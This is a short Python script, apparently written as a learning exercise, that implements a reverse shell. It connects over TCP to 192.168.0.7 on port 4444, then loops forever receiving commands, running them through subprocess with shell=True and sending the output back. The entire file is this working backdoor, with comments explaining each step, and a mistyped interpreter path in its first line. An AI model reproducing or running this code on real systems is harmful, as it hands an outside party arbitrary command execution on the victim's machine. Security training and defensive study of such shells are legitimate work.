#!/usr/nin/python

import socket
import subprocess

# run subprocess to execute command
def execute_command(command):
    return subprocess.check_output(command, shell=True) # since this is a command lets set shell as true

# establish a connection back to our machine
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP connection
conn.connect(("192.168.0.7", 4444)) # start the connection

# maintain the session, and ask for commands in a loop
while True:
    command = conn.recv(1024) # Specify the buffer size
    command_result = execute_command(command) # execute command
    conn.send(command_result) # send the command and capture results

# close the connection
conn.close()       
